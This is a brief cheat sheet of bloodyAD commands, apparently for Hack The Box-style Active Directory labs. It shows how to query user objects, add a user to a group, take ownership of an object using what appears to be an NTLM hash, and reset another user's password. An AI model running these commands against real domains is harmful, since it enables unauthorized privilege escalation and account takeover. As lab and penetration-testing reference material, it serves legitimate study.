### Retrieving User Information
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username
```

### Adding user to group
```bash
bloodyAD --host "10.10.11.70" -d "local.htb" -u "john" -p 'password!' add groupMember "DEVELOPERS" "john"
```

### Setting owner
```bash
bloodyAD --host "10.10.11.10" -d "local.htb" -u "IT-Backup$" -p ":4de830d1d58c14e241aff55f82ecdba1" set owner SUPPORT_SERVICES IT-Backup$
```

### Changing password
```bash
bloodyAD --host '10.10.11.10' -d "local.htb" -u "john" -p 'password!' set password 'emily' 'P@ssw0rd!'
```